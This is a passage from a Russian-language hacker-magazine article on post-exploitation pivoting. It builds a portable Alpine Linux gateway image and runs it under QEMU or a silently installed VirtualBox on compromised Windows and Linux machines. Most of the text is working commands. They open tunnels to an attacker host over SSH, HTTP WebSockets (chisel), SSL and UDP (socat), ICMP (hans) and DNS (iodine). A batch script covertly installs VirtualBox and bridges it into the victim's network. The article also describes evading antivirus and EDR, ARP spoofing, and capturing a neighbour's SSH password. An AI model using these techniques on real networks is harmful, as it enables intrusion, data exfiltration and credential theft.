   Вто рой случай, когда нам могут пот ребовать ся права, — это виртуаль ный
сетевой интерфейс гос тевой ОС. Он может быть объеди нен с любым другим
интерфейсом хос товой ОС с помощью сетевого мос та. И то и дру гое для нас
не кри тич но. За первое мы зап латим лишь производительностью гос тевой
ОС, ведь теперь весь ее код будет выпол няться виртуальным процессором
(то есть транслироваться). Вто рой слу чай не позволит нам получить пол-
ноценный сетевой дос туп  к окружению скомпрометированной машины.
Однако сетевой дос туп в режиме NAT у нас будет в любом случае, и его хва-
тит как для большинства пивотинг-механиз мов, так и для подав ляюще го чис-
ла атак.
  Наконец, существует еще один важный момент — вся наша активность
будет происходить под завесой эмуляции и виртуализации, с использовани-
ем исклю чительно API виртуальной ОС, а не хостовой. И локальные средс тва
защиты (антивирусы/EDR) ока жутся за бортом.
   Развивать атаки в каж дом из возможных случаев мы сможем с исполь-
зованием все го двух виртуальных ОС:
 • gw.img — раз витие атак с правами или без прав и с каналом эксфильтра-
   ции;
 • attack.img — развитие атак с правами или без прав и без канала
   эксфильтра ции.

Са ми же образы для максималь ной обратной совместимости будут 32-бит-
ными, а интерфейс управления виртуалками — максимально простым и при-
год ным для любой, даже самой тяжелой обста новки, когда нет GUI-доступа
или нормального реверс-шелла.
  Наконец, под ход from scratch под разумевает сборку образа под любую
ситуацию. Ведь никогда не зна ешь наперед, насколько тон ким будет канал
передачи данных и сколько места на ата куемом хосте мы получим в свое рас-
поряжение.
  В каком бы окружении при постэксплуата ции мы ни оказались, с помощью
виртуализации или эмуляции мы вый дем победи телем каждый раз.





  Порядок действий при каж дом из возможных условий среды постэксплу -
  ата ции

И каждый раз мы будем использовать одни и те же привычные нам инстру-
менты любимого Linux.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ



             ИСПОЛЬЗУЕМ ЭМУЛЯЦИЮ
              И ВИРТУАЛИЗАЦИЮ ДЛЯ
                        ПИВОТИНГА





ÎÁÐÀÇ GW.IMG (POST_1)

Вне зависимости от того, имеются ли у нас адми нистра тивные пра ва на ском-
про метирован ной машине или нет, если у нас есть канал передачи данных
наружу, мы всег да дол жны исполь зовать его для организа ции сетево го дос-
тупа и развития пос ледующих атак. Не сто ит развивать атаки непосредс твен-
но со ском про мети рован ной системы, они выполняются с ноутбука ата-
кующего, а ском промети рованный узел использует ся лишь в качестве шлюза.
   Pivoting не сильно требователен в плане прав, и практически все то, что мы
спо собны сде лать при наличии высоких системных при виле гий, можно будет
реали зовать и без них. Поэто му сперва пос мотрим на более общие сце-
нарии, не тре бующие административных прав, то есть раз виваемые с уровня
L3, пригодного для совершения боль шинства последующих атак.
   Без прав адми нистратора или root мы не можем соз дать на хосте сетевой
интерфейс, ассо цииро ванный с гостевой ОС. Но обычные сокеты TCP/UDP
доступны даже непривиле гированному пользователю. А QEMU уме ет перех-
ватывать сетевую активность гостевой системы. И это значит, что виртуаль-
ная машина может быть запущена таким образом, что весь ее сетевой тра-
фик будет выходить через хостовую ОС (NAT) с использовани ем лишь
TCP/UDP-сокетов. А если учесть, что внут ри гостевой ОС мы всегда имеем
при виле гии, то этого будет дос таточно для открытия практически любого пол-
ноценного L3 VPN.





  Се тевой доступ уровня L3 — через непривилегиро ванные TCP/UDP-
  сокеты NAT-режима

Соберем пока все необходимое для пивотинга на сетевом и более высоких
уров нях.
  В качестве основы будем использовать минималис тичный образ Alpine
Linux:


sudo docker pull i386/alpine:3.18
sudo docker run --name gw -it i386/alpine:3.18 /bin/sh

Наш стартовый размер ОС будет сос тавлять всего 5,5 Мбайт. Неплохое
начало, однако на данный момент образ не содержит практичес ки ничего.
Следующие  пакеты  предос тавят нам  необходимый минимум  удобства
при работе с консолью (еще 4 Мбайт):


apk update
apk add tmux busybox-extras

Для разнообразных туннелирований и проб росов портов на все слу чаи жиз-
ни, а также работы с сетью уста новим дополнительные пакеты (19 Мбайт):


apk add openssh-client openssh-server iptables dhclient ppp socat
tcpdump

OpenSSH — главный инс тру мент для пивотинга. В нем есть все необходимые
pivoting-при митивы: пря мой и обратный проб рос пор тов, прокси и даже
L3/L2-тун нели.


ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key
vi /etc/ssh/sshd_config
  PermitRootLogin yes
  PermitTunnel point-to-point

Ути лита ssh всегда выручит нас, и вот как легко мы можем открыть L3-туннель:



  attacker> ssh -N root@gw -w 0:0
  attacker> ifconfig tun0 172.16.0.2/30 pointopoint 172.16.0.1
  gw> ifconfig tun0 172.16.0.1/30 pointopoint 172.16.0.2
  gw> echo 1 > /proc/sys/net/ipv4/ip_forward
  gw> iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
  attacker> sudo route add -net 10.0.0.0/8 dev tun0


Однако для своей работы ssh требует установить пол ноценное TCP-соеди-
нение. А такая возможность дос тупна далеко не всег да...
  В пивотин ге мы всег да реша ем две задачи. Первая — это поиск дос тупно-
го канала эксфильтрации и формирова ние на нем пригодного примитива
для передачи дан ных. Вторая задача уже чис то адми нистра тивная — орга-
низация удобного тун неля через доступный нам канал эксфильтра ции. Час то
первая задача решается быстро, но при наличии IDS/IPS мы можем стол-
кнуться с различными слож ностями, когда разрешены могут быть лишь опре-
деленные протоколы, нап ример SSL/TLS или HTTP.
  Протокол HTTP также имеет свои особен ности. Например, доступ к про-
извольным  хос там  может  быть  запрещен,  но  разрешен  WebSocket,
или наобо рот. Возможна ситуация, когда межсетевой экран бло кирует всё,
но по какой-то при чине адми нис тра торы забыва ют про ICMP. И наконец, DNS,
наш верный козырь в рукаве, будет работать почти всегда, давая канал
эксфильтрации в самых тяжелых случаях.
   Та ким образом, перед комфортным пивотин гом нам предстоит нащупать
канал эксфильтрации. И тут мы должны проработать самые раз нообразные
транспор ты, через которые потом откро ем VPN-туннель.
  Вполне возможно, что в скомпрометирован ной системе дос туп в интернет
открыт только HTTP-тра фику. Тут нам поможет  chisel, который обладает
одним пре имуществом — он использует HTTP, а имен но WebSockets:



  attacker> ./chisel server -p 8080 --reverse
  gw> ./chisel client attacker:8080 R:socks
  attacker> echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
  attacker> sudo proxychains ssh -N root@localhost -w 0:0


WebSockets — отно ситель но новая технология, и в некото рых межсетевых
экранах, а также в IDP/IPS-системах ее поддер жка может отсутс твовать.
Быва ет и так, что средства IDS/IPS активно вме шиваются в HTTP, но не тро-
гают HTTPS. Тут нам может пригодиться SSL-туннелиро вание. Оно позволит
сде лать любой протокол неотличимым от SSL. Реали зовать мы это можем
буквально в одну команду, с помощью socat. Со сто роны скомпро метирован-
ной системы это будет TCP<>SSL, со сто роны ата кующе го — SSL<>TCP,
а уже меж ду ними — чис тый SSL.





                             SSL-туннель



  gw> socat -v tcp-listen:8080 openssl:attacker:443,verify=0
  attacker> socat -v openssl-
  listen:443,fork,cert=cert_key.pem,cafile=cert.pem,verify=0 tcp-
  connect:127.0.0.1:22


Socat соз дает нечто вроде пай па: с одной сто роны это TCP, а с другой SSL.
SSL смотрит в сторону интернета, а в нашу сторону работает обычный TCP,
с которым мы уже уме ем обращать ся:



  gw> ssh -p8080 proxy@localhost -R 2222:127.0.0.1:22
  attacker> sudo proxychains ssh -p2222 -N root@localhost -w 0:0


В ито ге обычное подключение TCP SSH обернуто в SSL. Если запрещен весь
TCP, но по какой-то причине возможен UDP (такое бывает), то socat тоже
выручит нас. Он соз даст для нас проз рачную UDP-обертку абсолютно ана-
логичным образом.





                            UDP-тун нель



  gw> socat -v tcp-listen:8080 udp-connect:attacker:53
  attacker> socat -v udp-listen:53,fork tcp-connect:127.0.0.1:22


А к ней мы уже можем применить любой классический инс трумент пивотинга:



  gw> ssh -p8080 proxy@localhost -R 2222:127.0.0.1:22
  attacker> sudo proxychains ssh -p2222 -N root@localhost -w 0:0


Те перь обыч ное под клю чение TCP SSH обернуто в UDP.
   Если ни TCP, ни UDP не разрешен — про веря ем ICMP:



  attacker> sudo ./hans -s 172.16.0.1 -p password
  gw> sudo ./hans -c attacker -p password -a 172.16.0.10


Инс трумент  hans  самос тоятельно  создаст  для  нас  пол ноценный  L3-
интерфейс. На случай, если со ском прометирован ной машины нет и такого
выхода в сеть, остается последний вариант — DNS-туннель:



  attacker> ./iodined -f -P password 172.16.0.1 attacker.tk
  gw> ./iodine -f -P password attacker.tk


Точ но так же iodine создаст L3-интерфейс. И точно так же через него мы
можем открыть более полноценный туннель уже с использовани ем SSH.
  Все необходимое для пивотинга на все случаи жизни мы собрали. Все
инструменты помеще ны в небольшой Linux-кон тей нер, который мы далее
сможем деп лоить на атакуемую машину средствами виртуали зации или эму-
ляции.
  Но еще нужно предусмотреть механизм настройки для выбора под-
ходящего туннеля. Заранее мы не можем предугадать, с какими сложностями
в начале постэксплуатации мы столкнемся. Возможно, это будет доступ к сис-
теме без GUI и нормальной консоли. Поэтому было бы неплохо уметь
управлять нашей постэксплуатационной виртуал кой чем-то нас только прос-
тым, что можно было бы реали зовать даже с использовани ем L7-доступа.
Чем-то наподобие веб-шелла или скрипта Bash или PowerShell. И это Telnet!
  Поддержка Telnet присутс твует в BusyBox, который мы уже установили
в самом начале. Однако для того, что бы мы могли удаленно залогиниться,
пот ребуется присвоить пароль root и соз дать неп ривиле гированного поль-
зователя:


passwd root
adduser -s /bin/sh user
chmod u+s /bin/busybox

Что бы Telnet запус кался автоматически при запуске, а также сеть нас траива-
лась сама, потребуется небольшой скрипт автозапуска, пре дос тавляемый
пакетом openrc (5 Мбайт):


apk add openrc
touch /etc/local.d/init.start
chmod +x /etc/local.d/init.start
vi /etc/local.d/init.start
  #!/bin/sh


  dmesg -n 1
  mount -o remount,rw /
  ifconfig lo 127.0.0.1 netmask 255.0.0.0


  dhclient eth0
  #ifconfig eth0 172.16.0.200 netmask 255.255.255.0
  #route add -net default gw 172.16.0.1
  busybox-extras telnetd

Добав ляем скрипт автомати ческой нас трой ки в авто запуск:


rc-update add local

Сохраняем файловую систему ОС:


sudo docker export gw > gw.tar

В ито ге все наши ути литы уместились в 32 Мбайт! Userspace на этом готов.
Пос коль ку нам нужна полноценная ОС, а не образ Docker, нам потребуется
собствен ное ядро. Для начала создадим файл-образ, в который мы будем
всё переносить:


truncate -s 100M gw.img
fdisk gw.img
 n p w
sudo losetup -o $[2048*512] /dev/loop0 gw.img
sudo mkfs.ext4 /dev/loop0
sudo mount /dev/loop0 /media/iso

Те перь перене сем в образ наш юзерспейс:


cd /media/iso
sudo tar xvf $OLDPWD/gw.tar
sudo mkdir boot
cd -

Те перь соз дадим и перене сем ядро, а также необходимые драй веры:


cd /usr/src/linux-5.16.12
sudo make ARCH=i386 defconfig
sudo make ARCH=i386 menuconfig
    bridge: Networking support -> Networking options -> 802.1d
Ethernet Bridging <M>
    tun: Device Drivers -> Network device support -> Network core
driver support -> Universal TUN/TAP device driver support <M>
    ppp: Device Drivers -> Network device support -> PPP (point-to-
point protocol) support <M>, PPP support for async serial ports <M>,
PPP Deflate compression <M>
sudo make ARCH=i386 prepare
sudo make ARCH=i386 scripts
sudo make ARCH=i386 bzImage
sudo make ARCH=i386 modules
sudo make INSTALL_PATH=/media/iso/boot install
sudo make INSTALL_MOD_PATH=/media/iso/ modules_install
cd -

Настала оче редь заг рузчика.


sudo grub-install --target=i386-pc --boot-directory=/media/iso/boot/
gw.img --modules='part_msdos'      <5M
cat <<E | sudo tee /media/iso/boot/grub/grub.cfg
set timeout=5
menuentry "Alpine Linux" {
 linux /boot/vmlinuz-5.16.12 root=/dev/sda1 rw noapic
 initrd /boot/initrd.img-5.16.12
}
E

Те перь зай мемся RAM-диском:


sudo chroot /media/iso /bin/sh
echo nameserver 8.8.8.8 > /etc/resolv.conf
apk add mkinitfs
mkinitfs -k -o /boot/initrd.img-5.16.12 5.16.12
apk del mkinitfs
exit

Финальный размер нашего pivoting-образа все го 71 Мбайт!


sudo umount /media/iso/
sudo losetup -d /dev/loop0

Эта виртуалка подготов лена как универ сальный шлюз со всеми необходимы-
ми инструмен тами на все случаи жизни. Она поз волит нам организовать VPN-
туннель через любое доступное под ключение. При этом сам канал эксфиль-
трации между атакующим и жертвой может быть как простым TCP-соединени-
ем, SSL, HTTP, UDP, ICMP, так и экстре мальным DNS-туннелем. Пришло вре мя
испытать эту вир туальную машину в деле.


Èñïûòûâàåì GW.img íà QEMU â Windows (íåò ïðèâèëåãèé, åñòü
ýêñôèëüòðàöèÿ)
Первый кейс: мы на компьюте ре под управлением Windows, у нас есть канал
эксфильтрации наружу, но нет прав. Итак, посмотрим, что мы можем сде лать,
если на скомпрометированной машине мы не админы.
  В этот раз мы будем использовать не VirtualBox, а его прародителя QEMU.
Он не требует административных прав и может работать без уста нов ки. Пор-
тативный софт — это всег да удобно. Да и размер виртуальной машины в упа-
кованном виде будет составлять всего порядка 10 Мбайт.
   Так как одно из начальных усло вий — отсутс твие прав, то от исполь-
зования виртуализации (гипер визора) придется отказаться в пользу старого
доб рого  метода  эмуляции. Виртуальная машина QEMU  поддерживает
не  толь ко  raw-образы  диска,  но  и  собственные форматы.  Поэтому
перед копировани ем образа на ском прометирован ную машину пре обра зуем
его:


qemu-img convert gw.img -O qcow2 gw.qcow2

Уход от raw-обра за диска необязателен, но полезен тем, что оптимизи рует
пустоты и делает фактический размер обра за равным объ ему содержащихся
в нем полезных данных. Так мы можем оста вить сво бод ное место на диске
виртуалки, не увеличи вая раз мер образа. Для запуска виртуальной машины
нам не потребуются права, поскольку все будет про исходить программно,
без привлечения железа:


qemu-system-i386.exe -hda gw.qcow2 -m 64M -net nic -net user,hostfwd=
tcp::2323-:23,hostfwd=tcp::2222-:22

Тут, помимо того что запускаем вир туальную машину, мы пробрасываем
на нее сквозь NAT два порта — Telnet (управляющий) и SSH (для pivoting).
И  после  запуска  виртуалки обра щение  к  неп ривиле гированным  пор-
там 2323/TCP и 2222/TCP на скомпро метированном хосте приведет нас
к GW-образу. Аналогич ным образом можно пробросить и другие порты.
  В ито ге магией эмуляции мы иска зили реальность и внутри неп ривиле-
гированной Windows-сессии у нас появляет ся при вилегированный root-шелл
Linux.





                Мечта хакера — root-шелл на Linux

Так ли нам нужно повышение привилегий? Раз гадка фокуса в том, что все
наши права огра ничи вают ся лишь фай лом — нашим вир туальным обра зом
Linux. А все гос тевые сетевые пакеты на хостовой ОС будут обработаны прос-
тыми неп ривиле гированными сокетами TCP/UDP.
  Тем не менее, если у нас есть root, внутри контей нера мы можем делать
всё, что захотим. А если снаружи виртуаль ная машина перехватывает сеть
гос тевой ОС и оборачивает всё прос тыми сокета ми, то этого достаточно
для откры тия практически любого VPN-туннеля с внеш ним миром.





        VPN-туннель L3 воп реки отсутствию адми нистра тивных прав

В ито ге мы име ем полноценный VPN-туннель L3 без привиле гий. По сути,
со сто роны ском прометированной машины это L4-туннель, работающий уже
на транспортном уровне. Но со стороны атакующе го это все тот же L3,
к которому при менима классическая мар шрутизация и пробросы портов.
Через него мож но про водить полноцен ные быстрые ска нирования портов (в
отли чие от прок си) для развития дальнейших атак. Все, кроме перехвата тра-
фика, — это при вилегия уровня L2, и мы до него еще дой дем...


Èñïûòûâàåì GW.img íà qemu-system â Linux (íåò ïðèâèëåãèé,
åñòü ýêñôèëüòðàöèÿ)
Что насчет Linux? Предста вим, что мы попали на компь ютер с этой системой
и у нас ожи даемо отсутствуют пра ва root.
  В Linux существует замечательный механизм chroot, ограничивающий
работу с файлами в пределах указанной папки и соз дающий тем самым
эффект контейнера. Но системный вызов chroot — при вилегированная опе-
рация. Тем не менее chroot не выглядит опе рацией, тре бующей ядерных при-
вилегий, ведь это все го лишь усечение части пути, а путь — понятие более
близкое к user-mode.
  Значит, добиться это го мож но чисто из userspace и без наличия прав.
Для этого можно использовать fakechroot. Биб лиоте ка fakechroot перех-
ватывает биб лиотеч ные вызовы от приложения, исполь зующие эти самые
пути (API-функции работы с файлами, а также поиск самих библиотек), и про-
изводит усе чение этих путей.
   Аналогич но можно обмануть программу и выдать себя за супер поль-
зователя, под меняя результаты вызовов getuid() и getgid(), — именно так
работа ет fakeroot.





          Обманываем сами себя и говорим, что мы root

Однако это лишь фикция. Даже если мы станем root и, абс тра гировавшись
от корневой файловой системы, зайдем в кон тейнер, так мы обма нем лишь
userspace. Но ядро этим спо собом не про ведешь. К тому же часть pivoting-
ком понентов находится в ядре — это драйверы, предос тавля ющие нам пол-
ноценные сетевые интерфейсы и мос ты.
  Поэто му на  Linux эмуляция будет для нас оптимальным решением,
и исполь зовать мы будем QEMU — суперунивер саль ный инс трумент. Linux-
системы очень многогранны, и при постэксплуатации почти всегда мы будем
сталкиваться с несов падени ем версий библиотек.
  Поэто му, что бы QEMU запускался без проб лем на разных ОС с разными
версиями биб лиотек, нам пот ребу ется сборка со статичес кой компиляцией.
Еще нуж но позаботиться о том, что бы QEMU оди наково хорошо запускался
как на x86, так и на x86_64, поэто му для обратной совместимости соберем
его в 32-битном исполнении:


sudo apt install git gcc g++ make python3-venv ninja-build meson pkg-
config libglib2.0-dev libpixman-1-dev libslirp-dev
git clone https://github.com/qemu/qemu && cd qemu
git clone https://gitlab.com/qemu-project/libslirp.git && cd libslirp
 meson build; ninja -C build install; ar rcs libslirp.a build/
libslirp.so.0.4.0.p/* .o; cd -
./configure --disable-werror --static --target-list=i386-softmmu,x86_
64-softmmu --without-default-features --enable-slirp
make -k -j4

Статическая ком пиляция делает исполня емый файл незави симым от биб-
лиотек, внедряя весь необходимый библиотечный код непосредственно
в сам исполняемый файл. В ходе сборки QEMU нам потребова лась биб-
лиотека libslirp, а в ее установоч ном пакете отсутс твовал объ ектный файл,
который и используется для вклей ки кода биб лиотеки в исполняемый файл
при статической компоновке. Именно поэто му данную библиоте ку приш лось
соб рать самостоятельно. Пос ле сбор ки QEMU нам потребу ются следующие
файлы.





     Пор тативный и перено симый QEMU запус тится вез де и без прав

Это значит, что с очень большой долей веро ятности такая сборка QEMU
запустится на любой ОС, как 32-, так и 64-битной, как на старой, так и на
новой.
  Запускаем вир туаль ную машину без адми нистра тивных прав:


./qemu-system-i386 -hda gw.img -m 64M -net nic -net user,hostfwd=tcp:
127.0.0.1:2323-10.0.2.15:23,hostfwd=tcp:127.0.0.1:2222-10.0.2.15:22

Пос коль ку виртуальная ОС будет работать за NAT, мы опять пробрасываем
в нее пор ты с хоста. И вновь мы исказили реальность и получили root внут ри
user.





                        Root-права from scratch

Те перь мы можем выполнить любой, даже самый сложный pivoting, предос-
тавив себе пол ноценный VPN-туннель L3.





  Закрываем глаза на все проб лемы и под нимаем VPN-туннель, несмотря
  ни на что и вопреки отсутствию root-прав

Мы запустили DNS-туннель и не поставили на скомпрометированной машине
ни одно го пакета! К тому же напом ню, адми нистра тив ных прав на этом компь-
ютере у нас не было. А VPN-туннель теперь есть.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ



             ИСПОЛЬЗУЕМ ЭМУЛЯЦИЮ
              И ВИРТУАЛИЗАЦИЮ ДЛЯ
                        ПИВОТИНГА





ÎÁÐÀÇ GW.IMG (POST_2)

Те перь представим себе более обнадеживающую ситу ацию: на скомпро-
метированной машине  у нас есть и адми нистративные пра ва, и канал
эксфильтрации наружу. Навер ное, это самый «везучий» кейс в плане воз-
можнос тей.
  При наличии должных прав эмуляция сетевых карт у современных вир-
туальных машин поз воляет создать в хостовой ОС полноценный виртуальный
сетевой  интерфейс,  который  с  помощью  bridge  можно  совместить
с основным сетевым интерфейсом хоста. Что и обес печит полноценное
копиро вание сетевых пакетов меж ду guest и host на скомпрометированной
машине.
  В то же время любой сетевой интерфейс VPN уже внутри гостевой ОС тем
же bridge может быть совмещен с ее основным интерфей сом Eth, на который
пакеты копируются с хоста уже силами эму лятора или вир туализации. В итоге
система из двух bridge способна прозрачно дос тавить любые пакеты хос та
с самого низкого L2-уровня в любой сетевой интерфейс гостевой ОС,
который мы соз дадим той или иной pivoting-утилитой.





          Се тевой дос туп уровня L2 — через двой ной bridge

В случае если на ском прометированной машине мы рас полагаем админис-
тратив ными правами, мы можем делать все то же самое, что было описано
выше, но плюс к этому нам открывается бонус: L2-атаки. И нам становятся
доступны такие мощ ные вещи, как MITM или spoong.
  Все необходимое для того, чтобы виртуальная ОС могла пре доставить
нам VPN-туннель L2, уже есть в нашем GW-образе — это OpenSSH. И для
акти вации L2-туннеля нам нуж на лишь одна строчка в его конфиге:


vi /etc/ssh/sshd_config
  PermitTunnel ethernet

Пе резапускаем sshd и загружа ем два драйвера:


/usr/sbin/sshd
modprobe tun
modprobe bridge

На сто роне ата кующе го мы под ключаемся по SSH:


sudo ssh root@victim -o Tunnel=ethernet -w any:any

Те перь и у атакующе го, и у жертвы одновремен но появляется сетевой TAP-
интерфейс. На сто роне целевой системы внутри GW-образа его нужно объ-
еди нить с основным сетевым интерфей сом Eth с помощью bridge:


brctl addbr br0; brctl addif br0 eth0; brctl addif br0 tap0;
ifconfig eth0 0 promisc; ifconfig br0 10.0.0.18 netmask 255.255.255.0
; route add -net default gw 10.0.0.1
ifconfig tap0 up

Точ но так же на сто роне хоста: его сеть должна быть сбриджена с сетевым
интерфейсом гос тевой ОС. И после этого пакеты нач нут заходить в наш тун-
нель, ведь, как мы помним, сетевой мост — это самый прос той способ
копиро вания пакетов меж ду сетевы ми интерфейсами. На стороне атакующе-
го TAP-интерфейс — это не что иное, как L2-портал в сеть victim:


dhclient tap0

Благода ря абстрагиро ванию от ОС жер твы с помощью технологии эмуляции
мы сможем при менять этот уни вер сальный трюк всякий раз вне зависимости
от установленной на скомпро мети рованной машине опе рационной системы.


Èñïûòûâàåì GW.img íà VirtualBox â Windows (åñòü ïðèâèëåãèè,
åñòü ýêñôèëüòðàöèÿ)
Виртуальная машина QEMU в ОС Windows не име ет под держки сетевых
интерфейсов на сто роне хос та. Но ее последователь VirtualBox — имеет.
К тому же у нее есть удобная консольная ути лита для объединения сетевых
интерфейсов в мост. Поэтому деплоим на скомпрометированном хосте
VirtualBox и запускаем в ней GW-образ нашего Linux в качестве универсаль-
ного шлю за.
  Поскольку запускать образ мы будем не на QEMU, а на VirtualBox, то
для начала нам надо сконвертировать наш образ в формат диска, понят ный
VirtualBox. И вновь это делается силами великого и могуче го QEMU (на сто-
роне ата кующего):


qemu-img convert gw.img -O vdi gw-disk001.vdi

Те перь на сто роне атакующего в VirtualBox остается лишь соз дать пустую
виртуалку с исполь зовани ем нашего готово го vdi-дис ка, а затем экспор-
тировать ее в самодостаточный ova-файл: Файл → Экспорт конфигураций →
Далее → Далее.
   Весь образ нашего супершлюза уместился в файл linux.ova раз-
мером 38 Мбайт. Образ такого формата максимально удо бен для импорти-
рования на ата куемую машину. Чтобы пос тавить VirtualBox в фоновом режиме
и без GUI, нужен пакет .msi. Предваритель но достать его можно из exe-
инстал лятора VirtualBox (на стороне атакующего):


virtualbox-5.2.6-120293-Win.exe -extract

В пап ке %USER%\appdata\local\temp\virtualbox\ появятся все необ-
ходимые файлы, которые нуж но будет скопировать на машину жертвы
для пос ледующей скрытой установки:


copy VirtualBox-5.2.6-r120293-MultiArch_x86.msi
copy VirtualBox-5.2.6-r120293-MultiArch_amd64.msi
copy common.cab
copy cert.cer
copy linux.ova
copy install.bat
start install.bat

Наконец, для автоматической уста новки на скомпромети рованном хос те
из консоли исполь зуем следующий скрипт .bat:


pushd %~dp0
certutil -addstore TrustedPublisher cert.cer
dir "c:\prog*86)" > nul 2> nul && (
        msiexec /i VirtualBox-5.2.6-r120293-MultiArch_amd64.msi /
quiet /log vbox_install.log ALLUSERS= 2 ADDLOCAL=VBoxApplication,
VBoxNetworkFlt VBOX_INSTALLDESKTOPSHORTCUT= 0
VBOX_INSTALLQUICKLAUNCHSHORTCUT= 0 VBOX_REGISTERFILEEXTENSIONS= 0
VBOX_START= 0 INSTALLDIR= c:\p ost\
) || (
        msiexec /i VirtualBox-5.2.6-r120293-MultiArch_x86.msi /quiet
/log vbox_install.log ALLUSERS= 2 ADDLOCAL=VBoxApplication,
VBoxNetworkFlt VBOX_INSTALLDESKTOPSHORTCUT= 0
VBOX_INSTALLQUICKLAUNCHSHORTCUT= 0 VBOX_REGISTERFILEEXTENSIONS= 0
VBOX_START= 0 INSTALLDIR= c:\p ost\
)
ping -n 300 127.0.0.1 > nul
c:\p ost\vboxmanage import linux.ova --options keepallmacs


c:\p ost\vboxmanage list bridgedifs|findstr /R "^Name:" > out.txt
setlocal enabledelayedexpansion
set /a c= 1
for /f "tokens=2*" %%i in ('type out.txt') do (
        echo c:\p ost\vboxmanage modifyvm linux --nic!c! bridged
--nictype!c! 82540EM >> out.bat
        echo c:\p ost\vboxmanage modifyvm linux --nic!c! bridged
--bridgeadapter! c! "%%i %%j" >> out.bat
        echo c:\p ost\vboxmanage modifyvm linux --nicpromisc!c! allow-
all >> out.bat
        set /a c= c+1
)
chcp 1251
call out.bat
chcp 866
c:\p ost\vboxmanage modifyvm linux --pae on
c:\p ost\vboxmanage modifyvm linux --ioapic on
c:\p ost\vboxmanage startvm linux --type headless

Ис поль зуя магию вир туализации, мы бриджим сетевые интерфейсы жертвы
(host-системы) и GW-образа (guest-системы).





  Инжект скрытой вир туалки в Windows с бриджингом ее сети — парази -
  тируем на сети скомпро метированного узла

Пос ле это го в сетевом сегменте жертвы появляет ся новый IP-адрес нашей
GW-системы.
  Для открытия L2-портала через GW внутри виртуал ки поднимаем по SSH
туннель L2 и точ но так же бриджим его уже с виртуаль ным интерфейсом eth0:


gw> vi /etc/ssh/sshd_config:
 PermitTunnel ethernet
gw> /usr/sbin/sshd
gw> modprobe tun
gw> modprobe bridge
attacker> sudo ssh root@vbox -o Tunnel=ethernet -w any:any
gw> brctl addbr br0; brctl addif br0 eth0; brctl addif br0 tap0;
ifconfig eth0 0 promisc; ifconfig br0 10.0.0.18 netmask 255.255.255.0
; route add -net default gw 10.0.0.1
gw> ifconfig tap0 up
attacker> dhclient tap0





  Произнесение зак линаний на GW для получения L2-доступа в сетевой
  сег мент жер твы

По факту мы име ем дело с двойным сетевым мостом. Пер вый на хосте дос-
тавляет все пакеты в сетевой интерфейс виртуаль ной машины. Второй уже
на сто роне гос тевой ОС — копиру ет пакеты в любой VPN-тун нель, который
мы соз дадим. А самый простой L2 VPN — это SSH.


                 Откры ваем с GW L2-тун нель VPN

Как бы далеко от жер твы мы ни находи лись, это дает нам еще один внут-
ренний IP-адрес прямо из ее подсети.




     Телепортация в сетевой сег мент ском промети рованной машины

По падание в сетевой сег мент рас ширя ет перечень атак прик ладного уровня
уже сетевыми: ARP spoong, mitm6, responder, coerce и так далее.





   Ата кующий удаленно раз вивает L2-атаки — например, NetBIOS spoong

В данном случае это решение проблемы несостоятельности ОС Windows
в вопросах L2-атак и перех вата тра фика.


Èñïûòûâàåì GW.img íà qemu-system â Linux (åñòü ïðèâèëåãèè,
åñòü ýêñôèëüòðàöèÿ)
Ес ли мы получили полные права на машине под управлением Linux — нам
повезло. Скорее всего, нам хва тит штатных возможностей ОС для проб роса
пор тов и туннелиро вания без всяких виртуалок. Но если это будет ста рая сис-
тема, на которой не окажется нужных пакетов, мы стол кнем ся с проблемами.
  Наша же задача как раз состоит в том, чтобы максималь но оградить себя
от необходимос ти администри рова ния скомпро метированных сис тем, абс-
трагировав шись от них портативной вир туальной машиной с ОС, где есть все
необходимое.
  На Linux с пол ными root-правами нам вновь поможет QEMU, только запус-
кать его мы будем уже с соз данием полноценного интерфейса L2 TAP:


./qemu-system-i386 -hda gw.qcow2 -m 64M -net nic,macaddr=00:11:22:33:
44:55 -net tap,script= no

QEMU создает в хостовой ОС TAP-интерфейс, связанный напрямую с Eth-
интерфейсом гостевой ОС. И чтобы пакеты из сети скомпрометированной
машины с ее Eth-интерфейса ста ли поступать через TAP-интерфейс внутрь
GW-образа, нужно сбриджить эти сетевые интерфейсы:


brctl addbr br0; brctl addif br0 eth0; brctl addif br0 tap0;
ifconfig eth0 0 promisc; ifconfig br0 10.0.0.100 netmask 255.255.255.
0; route add -net default gw 10.0.0.1





  Инжект портативной виртуальной машины для кра жи L2-дос тупа в сеть
  жертвы

И точ но так же, как и в прошлый раз, внутри гостевой ОС мы соз даем VPN-
туннель  через SSH. Продолжаем бриджить ее  Eth-интерфейс  c  TAP-
интерфейсом уже SSH-тун неля:


gw> /usr/sbin/sshd
gw> modprobe tun
gw> modprobe bridge
attacker> sudo ssh root@vbox -o Tunnel=ethernet -w any:any
gw> brctl addbr br0; brctl addif br0 eth0; brctl addif br0 tap0;
ifconfig eth0 0 promisc; ifconfig br0 10.0.0.18 netmask 255.255.255.0
; route add -net default gw 10.0.0.1
gw> ifconfig tap0 up
attacker> dhclient tap0

Ре зультатом будет телепор тация ата кующего в сетевой сегмент жертвы
через вир туальную машину.





  Полноценно (L2) заходим в сеть жертвы и начинаем там шалить — перех-
  ватывать трафик соседних машин

Ну и к примеру, последующая атака перехвата тра фика поз воля ет нам узнать
пароль SSH-подключения компа жертвы к сосед ним узлам.





     Успешная L2-атака перехвата трафика на узлы сетево го сегмента

Вместо соз дания собственных from scratch образов размером в несколько
десятков мегабайт мы всег да можем воспользоваться любым готовым обра-
зом. Ведь если в тво ем распоряжении есть канал эксфильтрации, можно дос-
тавить на ском прометирован ную ОС образ размером вплоть до нес кольких
гигабайт.


ÇÀÊËÞ×ÅÍÈÅ

Мы рассмотрели организацию пивотинга во всех возможных сце нариях пос-
тэксплуатации  с  каналом  эксфильтрации —  на  Windows  и  на  Linux,
при наличии прав и без таковых. Благодаря технологиям эмуляции и вир-
туализации эти сценарии кажутся очень похожи ми даже на разных ОС, абс-
трагируя нас от опе раци онной системы на хос те и пре доставляя еди ный
интерфейс — один и тот же образ, одни и те же при выч ные pivoting-утилиты.
  Вир туали зация и эму ляция делают возможным универсальный pivoting-
под ход на все случаи жизни, пок рывая любые ситуации, с которы ми толь ко
